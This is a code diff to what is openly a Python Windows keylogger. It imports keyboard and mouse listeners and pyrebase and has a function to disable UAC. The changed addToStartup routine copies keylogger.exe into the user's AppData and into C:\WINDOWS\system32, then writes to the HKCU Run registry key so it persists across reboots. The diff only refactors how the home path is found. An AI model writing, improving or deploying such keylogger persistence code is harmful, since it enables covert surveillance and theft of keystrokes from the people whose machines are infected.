@@ -11,6 +11,7 @@ from pynput import keyboard, mouse
 from datetime import datetime as date
 import pyrebase
 import win32com.shell.shell as win32shell
+from pathlib import Path
 
 
 def disable_UAC():
@@ -169,15 +170,15 @@ def on_click(x, y, button, pressed):
 
 def addToStartup():
     try:
-        USER_NAME = getpass.getuser()
+        home = str(Path.home())
         src = str(os.getcwd()) + '\\keylogger.exe'
-        dst = r'C:\Users\%s\AppData' % USER_NAME
+        dst = home + '\\AppData'
         shutil.copy2(src, dst)
 
         dst = r'C:\WINDOWS\system32'
         shutil.copy2(src, dst)
 
-        exePath = 'C:\\Users\\%s\\AppData\\keylogger.exe' % USER_NAME  # name of script after making EXE
+        exePath = home + '\\AppData\\keylogger.exe'   # name of script after making EXE
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                              r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0,
                              winreg.KEY_SET_VALUE)
